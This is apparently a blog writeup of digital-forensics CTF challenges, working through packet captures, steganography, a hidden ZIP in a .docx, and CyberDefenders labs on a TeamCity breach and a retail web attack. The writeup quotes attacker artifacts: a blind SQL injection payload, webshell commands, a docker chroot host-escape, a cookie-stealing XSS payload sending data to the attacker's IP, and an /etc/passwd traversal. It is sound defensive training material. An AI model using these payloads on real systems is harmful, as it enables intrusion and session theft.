---
title: "Digital Forensics: Dreamhack Wargames, CyberDefenders & HackTheBox"
description: "What are you afraid of losing, when nothing in the world actually belongs to you?"
draft: false
date: 2026-10-01
tags:
  - Network Forensics
  - Disk Forensics
  - Memory Forensics
  - Steganography
categories:
  - Writeup
cover: "https://i.pinimg.com/736x/26/fd/ac/26fdace7db70d8cb4c0803315d518327.jpg"
banner: "https://i.pinimg.com/736x/26/fd/ac/26fdace7db70d8cb4c0803315d518327.jpg"
lastmod: 2026-10-25T09:39:36.575Z
---

## 1. sleepingshark

- **Date**: Oct 2, 2026
- **Difficulty**: Dreamhack - Gold

We are presented with a packet capture. At first glance, there are a lot of HTTP requests with the same structure.

![.](/images/posts/0000.png)

For example: 

```sql
SELECT%20IF%28ASCII%28SUBSTRING%28%28SELECT%20flag%20FROM%20s3cr3t%20LIMIT%201%29%2C35%2C1%29%29%3D156%2C%20SLEEP%283%29%2C%200%29
``` 

With an URL decoder, this is translated into

```sql
SELECT IF(ASCII(SUBSTRING((SELECT flag FROM s3cr3t LIMIT 1),35,1))=156, SLEEP(3), 0)
```

This is a typical example of an SQL injection payload used for blind time-based data exfiltration. You can read more about it in this [Portswigger's article](https://portswigger.net/web-security/sql-injection/blind).

To visualize, let's take a closer look at the timestamps:

![.](/images/posts/0001.png)

All of the requests go by the structure:

```sql
SELECT IF(ASCII(SUBSTRING((SELECT flag FROM s3cr3t LIMIT 1),x,1))=y, SLEEP(3), 0)
```

This query test if the letter in position x equals the value y. If correct, it will sleep for 3 seconds; else, do nothing. Therefore, all of the payloads are incorrect, except for the one before the time leap. We can filter the correct payload manually by following the stream and extract each characters one by one for the flag.

For example,

```sql
SELECT IF(ASCII(SUBSTRING((SELECT flag FROM s3cr3t LIMIT 1),1,1))=71, SLEEP(3), 0)
``` 
cause the time leap, therefore flag's letter #1 has the ASCII value of 71 (G).

Or we can automate the process with tshark commands:

```bash
tshark -2 -r dump.pcap -Y 'http.request or http.response' \
  -T fields -e tcp.stream -e http.request.uri -e http.time |
awk -F '\t' '$2 ~ /SUBSTRING/ {q[$1]=$2} $3+0 > 2.75 {
  split(q[$1], x, /%2C|%3D/)
  print x[2], x[4], sprintf("%c", x[4])
}' | sort -n
```

![.](/images/posts/0002.png)

**`GoN{T1mE_B4s3d_5QL_Inj3c7i0n_wI7h_Pc4p}`**

## 2. Dream Zoo

- **Date**: Oct 5, 2026
- **Difficulty**: Dreamhack - Gold

We are presented with a packet capture. At first glance, there is DNS exfiltration of a ZIP file, as we can see `50 4b...`

![.](/images/posts/0060.png)

Retrieve the ZIP with this shell script:

```
#!/usr/bin/env bash
set -euo pipefail

if [[ $# -lt 2 || $# -gt 3 ]]; then
  echo "Usage: $0 capture.pcapng output.bin [exfil-domain]" >&2
  exit 2
fi

pcap=$1
output=$2
zone=${3:-}

tshark -n -r "$pcap" \
  -Y 'dns.flags.response == 0 && dns.qry.type == 16' \
  -T fields -E occurrence=f -e dns.qry.name |
awk -v zone="$zone" '
function ishex(s) { return s ~ /^[0-9a-f]+$/ }
{
  name = tolower($0)
  sub(/\.$/, "", name)
  n = split(name, part, ".")

  limit = n
  if (zone != "") {
    z = split(tolower(zone), suffix, ".")
    if (n <= z) next
    matchzone = 1
    for (i = 1; i <= z; i++)
      if (part[n-z+i] != suffix[i]) matchzone = 0
    if (!matchzone) next
    limit = n - z
  }

  for (i = 1; i <= limit && ishex(part[i]); i++)
    printf "%s", part[i]
}
END { print "" }
' | xxd -r -p > "$output"

echo "Wrote $output"
file "$output"
xxd -l 8 "$output"
```

Extract the ZIP file, we get images of a bunch of animals, as well as the hint: "Animals that receive hearts are hiding something." 

![.](/images/posts/0061.png)

In the images, the animals that received the hearts are dog, squirrel, and hamster. And the cat image has a drawing of a "flag". The next step should be steganography, I suppose. 

And then, in an autopilot manner, I tried a plethora of steganography decoding techniques, ranging from spamming WSL commands to Online Stegnography Decoder, but sadly, none of them carve out any hidden messages... 

Except for one: OpenStego. An ancient technique that receded into the mist of time. Too bad I forget about this :(˜­

![.](/images/posts/0062.png)

Extract without password those three images, we get another 3 sussy file: giraffe.png, hint2.png, and parrot.png

- The giraffe image actually contains 2 giraffes, with a message: "How many animals exist in the zip file in total?"
- The parrot image also contains 2 parrots and a message: "XOR"
- and hint2.txt: ( cat's hidden ) ( squirrel's hidden ) ( dog's hidden ) = FLAG

We've already known that squirrel's hidden is **XOR**, and dog's hidden is the total amount of animals. Count them all and we have 10 original + 2 giraffes + 2 parrots = 14. So now the flag is `(cat's hidden) XOR 0x14`

Initially, I don't know what (cat's hidden) could possibly mean. After a while, it's dawned on me that I am supposed to utilize OpenStego, again. Extract `cat.png` using OpenStego, and we retrieve `flag.txt` (so aptly named) as followed:

```text
JFu:l`>|c:bQj`}Q~:me=zQb=:e}Qj:z:s
```

![.](/images/posts/0063.png)

**`DH{4bn0rm4l_dns_p4ck3t_l34ks_d4t4}`**

## 3. Don't miss the data

- **Date**: Oct 6, 2026
- **Difficulty**: Dreamhack - Platinum

We are presented with a `.docx` file. Its content is of little significance, so as usual, I inspected the metadata. After spamming `xxd` and `binwalk`, I've extracted a ZIP file containing a lot of `.xml`. At first, I thought I was discovering something abnormally important. Little did I know, I was just reinventing the wheel. `xxd` and `binwalk` is kinda extra in this context, truly a "spam vs. skill" moment :(

> The `.docx` itself, intrinsically, is a `.zip` archive containing XML files, images, and other structural components. According to this [article](https://www.reddit.com/r/LifeProTips/comments/36taq3/lpt_a_word_file_is_a_zip_in_disguise/), you can access or inspect the hidden contents of any modern Microsoft Word file by changing its file extension. 

The takeaway is that, whenever you see a `.docx`, you should be thinking about its `.zip`. Once opened or extracted, you will see a structured folder system:
- `word/`: Contains the core content, including a media folder where all embedded images, videos, or audio files are stored raw.
- `docProps/`: Contains document properties like author name, creation date, and editing time.
- `_rels/`: Contains relationship mappings for how different parts of the document connect.
- `[Content_Types].xml`: Defines the types of XML content used in the archive package

Wandering around, I noticed that the files in here are relating to the original `.docx` file itself, nothing special. However, in `word/media/`, there is a weird file called `header_bg.png`, a blank image, which is nowhere to be seen in the original document...

Upon inspecting its metadata, there seems to be a ZIP archive hidden within. 

![.](/images/posts/0032.png)

However, there is a corruption when I try to extract the hidden ZIP. 

![.](/images/posts/0031.png)


**Solve script**

```
#!/usr/bin/env bash
set -euo pipefail

file="hidden_repaired.zip"

dd if=header_bg.png of="$file" bs=1 skip=852 count=513 status=none

printf '\x50\x4b\x03\x04' | dd of="$file" bs=1 seek=0   conv=notrunc status=none
printf '\x0a\x00'         | dd of="$file" bs=1 seek=26  conv=notrunc status=none
printf '\x50\x4b\x01\x02' | dd of="$file" bs=1 seek=300 conv=notrunc status=none
printf '\x50\x4b\x05\x06' | dd of="$file" bs=1 seek=491 conv=notrunc status=none
```

After successfully decompress the ZIP file, we are presented with yet another problem: the secret memo file requires a password.

![.](/images/posts/0033.png)

> Any file starts with ~WRD (typically with a .tmp extension) is a hidden temporary work file automatically created by Microsoft Word while a document is actively open.

Wandering in the folder system, I stumbled upon a seemingly base64 "keyWrap" with a very sussy name "Top Secret".

![.](/images/posts/0034.png)

This encoding `nTyxMTIhK0EuqTR=` seems like a base64, but CyberChef can not decode that, not even the Magic mode. It ends up to be a `ROT13 --> Base64` with some brute-forcing.

![.](/images/posts/0036.png)

We retrieve the passphrase `hidden_Data` to open the temporary memo file.

![.](/images/posts/0035.png)

This time around, this base64 is simply the flag we are looking for.

**`INCOGNITO{Orphan3d_Obj3cts_R3v3al_Tru3_Int3nt}`**

## 4. Jetbrains

- **Date**: Oct 22, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 1

We are presented with a packet capture and nine questions pertaining to it.

**Q1: Identifying the attacker's IP address helps trace the source and stop further attacks. What is the attacker's IP address?**

At first glance, the packet is fraught with a multitude of suspicious HTTP requests. Indeed, the vulnerability lies in the web server.

![.](/images/posts/0064.png)

The conversations of those HTTP stream reveals that there is an influx of requests from the IP `23.158.56.196`

![.](/images/posts/0065.png)

Moreover, those requests come in all sizes and shapes.

![.](/images/posts/0066.png)

To list a few suspicious HTTP payload in the packet:
```
- `GET /authenticationTest.html?csrf HTTP/1.1`
- `POST /generateId.html HTTP/1.1\r\n (application/x-www-form-urlencoded)`
- `POST /ajax.html HTTP/1.1\r\n (application/x-www-form-urlencoded)`
- `HTTP/1.1 200 (text/plain)`
- `GET /app/oauth/space/connections/project/_Root?fullMatch=false&capability=CREATE_SUB_CONNECTION&capability=ISSUE_USER_TOKEN&unwantedCapability=IS_SUB_CONNECTION&queryUserTokens=true&queryPendingType=true HTTP/1.1\r\n`
- `GET /admin/createProject.html?init=1&parentId=_Root&embedded=true&cameFromUrl=%2Ffavorite%2Fprojects HTTP/1.1\r\n`
- `POST /hax?jsp=/app/rest/users/id:2/tokens/mD5r0yemB0;.jsp HTTP/1.1\r\n`
```
![.](/images/posts/0067.png)

These are evidence of CSRF, [the Cross-Site Request Forgery attack](https://portswigger.net/web-security/csrf).

And they all coming from the aforementioned IP address, further reinforcing that it is indeed the attacker's.

`Answer: 23.158.56.196`

**Q2: To identify potential vulnerability exploitation, what version of our web server service is running?**

We've already known that HTTP requests are suspicious, as well as the attacker's IP address. Therefore let's apply the filter for that with: 

`ip.src == 23.158.56.196 && http`

In the response body of the request 

`GET /hax?jsp=/app/rest/server;.jsp`, 

you will find a metadata field called `<server version>`.

A more efficient method can be filtering for keyword, in this case, `server`.

`Answer: 2023.11.3`

**Q3: After identifying the version of our web server service, what CVE number corresponds to the vulnerability the attacker exploited?**

Upon looking up the vulnerability for TeamCity with the aforementioned server version, we found two relevant articles from [Splunk](https://www.splunk.com/en_us/blog/security/security-insights-jetbrains-teamcity-cve-2024-27198-and-cve-2024-27199.html) and [Rapid7](https://www.rapid7.com/blog/post/ra-cve-2024-27198-analysis/).

`Answer: CVE-2024-27198`

**Q4: What credentials did the attacker successfully use for Basic Auth against the TeamCity server?**

In the same request as of Q3, we can see the metadata (credentials) right down below.

`Answer: c91oyemw:CL5vzdwLuK`

**Q5: The attacker uploaded a webshell to ensure his access to the system. What is the name of the file that the attacker uploaded?**

> A web shell is a malicious script or small program uploaded to a compromised web server that lets an attacker control the server remotely through a standard web browser (HTTP or HTTPS). First, attackers break into a website or application by exploiting vulnerabilities such as unpatched software, weak passwords, file upload flaws, SQL injections,... Then, they upload a script written in a server-side language - most commonly PHP, ASP/ASPX, JSP, or Python - disguised as a normal file or hidden inside existing code. Instead of logging in through standard terminal tools (like SSH), the attacker could navigate to the uploaded script via a web URL and runs system commands, manages files, or accesses databases directly through the browser. Attackers use web shells during the post-exploitation phase for persistence, data theft, pivoting, or spreading malware.

Upon inspecting `POST /admin/pluginUpload.html` in the same HTTP stream, we can see the file that the attacker upload:

`Content-Disposition: form-data; name="file:fileToUpload"; filename="NSt8bHTg.zip"` 

Interestingly, scattering throughout the packet, we can also see the request with the name `POST /plugins/NSt8bHTg.jsp HTTP/1.1 (application/x-www-form-urlencoded)`, which is also the name of the file mentioned.

> This is an indication of a vulnerability called [Zip Slip](https://darkt.medium.com/zip-slip-leading-to-remote-command-execution-in-java-application-fd3c41150b71), wherein a malicious `.zip` file can contain path traversal filenames. If the application extracts the archive without validating file paths, the attacker can write a backdoor `.jsp` file directly into the server's web root, leading to Remote Code Execution (RCE).

`Answer: NSt8bHTg.zip`

**Q6: When did the attacker execute their first command via the web shell?**

Apply the filter for the attacker's IP address and the keyword "cmd":

`ip.addr == 23.158.56.196 && frame contains "cmd"`

Look for the first one (which is `cmd=ls`, executed via the `.jsp` web shell), and view the UTC Arrival Time.

`Answer: 2024-06-30 08:03`

**Q7: The attacker tampered with a text file that contained the credentials of the admin user of the webserver. What new username and password did the attacker write in the file?**

We keep searching along the lines of `cmd` (since the question tell us that the attacker **wrote** something). Indeed, we encounter a request that contains that mentioned command:

`cmd=bash -c echo "username:a1l4m,password:youarecompromised" > /tmp/Creds.txt`

`Answer: a1l4m:youarecompromised`

**Q8: Q7 showed the attacker writing false credentials into Creds.txt. Which MITRE ATT&CK sub-technique (Data Manipulation family) describes that specific file-write action?**

![image](/images/posts/dreamhack-933703/image-1792857821949-684f88.png)

Well, there is only three sub-techniques. Initially, I'm torn between Stored Data Manipulation (T1565.001) and Transmitted Data Manipulation (T1565.002)

> **Stored Data Manipulation (T1565.001)**: *"Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making."*
> 
> **Transmitted Data Manipulation (T1565.002)**: *"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making."*

After some pondering, well, we can come to a plausible conclusion that: the attacker used a web shell to run some commands to change data stored on the server, like, the `Creds.txt` is pretty much static. And there is no sign of altering any data en route to the server or modifying system processes that I know of.

`Answer: T1565.001`

**Q9: Immediately after gaining a shell, the attacker executed a docker command that mounted the host filesystem and chrooted into it - providing full host access. What was that exact command?**

The keyword this time to filter should be `docker` and `chroot`.

![image](/images/posts/dreamhack-933703/image-1792899790542-0fe7b0.png)


`Answer: docker run --rm -it -v /:/host ubuntu chroot /host`


## 4. RetailBreach

- **Date**: Oct 24, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 1

**Q1: Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?**

We can see that there are two different IP addresses in the HTTP session. The first client IP (135.143.142.5) logged in normally, while the second IP (111.224.180.128) failed initial login attempts, before hijacking the active session token.

`Answer: 111.224.180.128`

**Q2: The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?**

We can see an influx of HTTP GET requests from the attacker, with the form of `./passwd`, `./htpasswd`, `/chpasswd`,... Upon clicking on these requests, we can see this directory brute-forcing use gobuster.

`Answer: gobuster`

**Q3: Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?**

Applying the filter for the IP address of the attacker, as well as the the keyword `script`, we can find out the XSS payload.

![image](/images/posts/dreamhack-933703/image-1792899900701-b0b553.png)

`Answer: <script>fetch('http://111.224.180.128/' + document.cookie);</script>`

**Q4: Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?**

From the previous question, we can see that the attacker execute the XSS in `/reviews.php`. And we have also inferred that `135.143.142.5` is IP address of the admin. Therefore, we just need to locate the first time the admin access that page.

`Answer: 2024–03–29 12:09`

**Q5: The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access?**

The admin encountered the malicious script in the previous question, and right after the attacker has successfully access the privilege unauthorizedly, from which you can see the session token.

`Answer: lqkctf24s9h9lg67teu8uevn3q`

**Q6: Identifying which scripts have been exploited is crucial for mitigating vulnerabilities in a web application. What is the name of the script that was exploited by the attacker?**

Let's utilize the newfounded session token. Filtering for the "session token" and the "attacker's IP address":

`ip.addr == 111.224.180.128 && frame contains "lqkctf24s9h9lg67teu8uevn3q"`

Among the request, there is this suspicious one:

`GET /admin/log_viewer.php?file=../../../../../etc/passwd`

This suggests the attacker was attempting to access sensitive system files via `?file=` parameter.

> `log_viewer.php` is a PHP script. It is commonly used as a web-based utility to read, format, and display server or application log files (such as Apache, Nginx, Dolibarr, or custom framework logs) directly inside a browser. In some web applications or plugins, `log_viewer.php` or similar log-viewing endpoints can also be targets for security vulnerabilities or exploitation if they lack proper authentication or input validation (such as path traversal or cross-site scripting).

`Answer: log_viewer.php`

**Q7: Exploiting vulnerabilities to access sensitive system files is a common tactic used by attackers. Can you identify the specific payload the attacker used to access a sensitive system file?**

The answer lies in the payload of the previous question. The script `log_viewer.php` is indeed accessed and exploited via path traversal.

`Answer: ../../../../../etc/passwd`


























